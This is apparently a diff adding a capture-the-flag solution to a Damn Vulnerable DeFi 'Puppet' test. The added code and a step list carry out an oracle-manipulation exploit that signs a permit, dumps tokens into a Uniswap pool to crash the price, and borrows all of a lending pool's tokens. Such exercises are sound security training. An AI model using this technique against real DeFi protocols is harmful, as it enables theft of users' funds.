@@ -95,6 +95,77 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const blockTimestamp = (await ethers.provider.getBlock('latest')).timestamp;
+        const deadline = blockTimestamp * 2;
+
+        const attackContractFactory = await ethers.getContractFactory('PuppetAttack', player);
+        const attackerAddress = ethers.utils.getContractAddress({
+            from: player.address,
+            nonce: await player.getTransactionCount()
+        });
+
+        const contractName = await token.name();  
+        const chainId = await ethers.provider.getNetwork().then(({ chainId }) => chainId);
+
+        const domain = {    
+            name: contractName,    
+            version: "1",    
+            chainId,    
+            verifyingContract: token.address 
+        };
+
+        const Permit = [  
+            { name: "owner", type: "address" },  
+            { name: "spender", type: "address" }, 
+            { name: "value", type: "uint256" }, 
+            { name: "nonce", type: "uint256" },    
+            { name: "deadline", type: "uint256" },
+        ];
+
+        const nonce = await token.nonces(player.address);
+        const deadlinePermit = ethers.constants.MaxUint256;
+
+        const message = {
+            owner: player.address,
+            spender: attackerAddress,
+            value: PLAYER_INITIAL_TOKEN_BALANCE,
+            nonce: ethers.BigNumber.from(nonce),
+            deadline: deadlinePermit,
+        };
+
+        const signature = await player._signTypedData(domain, {
+            Permit,
+        }, message);
+        const { v, r, s } = ethers.utils.splitSignature(signature);
+
+        const calldata = uniswapExchange.interface.encodeFunctionData("tokenToEthSwapInput", [PLAYER_INITIAL_TOKEN_BALANCE, 1, deadline]); 
+
+        await attackContractFactory.deploy(
+            lendingPool.address,
+            token.address,
+            uniswapExchange.address,
+            player.address,
+            PLAYER_INITIAL_TOKEN_BALANCE, 
+            deadlinePermit, 
+            v, 
+            r, 
+            s, 
+            calldata, 
+            {
+                value: ethers.BigNumber.from(PLAYER_INITIAL_ETH_BALANCE).sub(10n**18n)
+            }
+        );
+
+        /* Steps:
+        1. Sign permit to give allowance of player's tokens to the attack contract
+        2. Transfer tokens from player to attack contract and also transfer all ETH while calling attack function (so contract becomes player now)
+        3. Swap all your tokens for ETH using Uniswap
+        4. This will reduce the ETH amount in Uniswap pair and result in much lower oracle price inside the Lending pool
+        5. Use this manipulated price to deposit less ether than actually required and borrow all tokens of the lending pool
+        6. Transfer all tokens and remaining ETH to player
+        7. Combining attack function with contract deployment will result in a single transaction
+        */
+
     });
 
     after(async function () {
